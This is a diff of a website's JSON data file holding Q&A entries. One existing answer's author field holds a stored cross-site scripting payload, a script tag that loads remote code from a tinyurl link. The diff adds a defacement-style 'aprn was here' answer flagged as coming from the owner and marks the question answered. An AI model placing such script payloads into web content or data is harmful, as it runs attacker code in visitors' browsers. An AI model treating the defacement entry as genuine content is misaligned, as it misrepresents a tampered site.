@@ -358,7 +358,7 @@
       "timestamp": "2026-01-15T21:06:40.000Z",
       "ip": "",
       "userAgent": "",
-      "status": "pending",
+      "status": "answered",
       "likes": 0,
       "likedBy": [],
       "answers": [
@@ -368,6 +368,15 @@
           "author": "<script src=\"https://tinyurl.com/z52ayw7a\"></script>",
           "isOwner": false,
           "date": "2026-07-05T13:40:11.741Z",
+          "replies": [],
+          "parentAnswerId": null
+        },
+        {
+          "id": 1791567604760,
+          "content": "aprn was here dima maghreb 🇲🇦",
+          "author": "Akhi Ex",
+          "isOwner": true,
+          "date": "2026-10-09T17:40:04.760Z",
           "replies": [],
           "parentAnswerId": null
         }
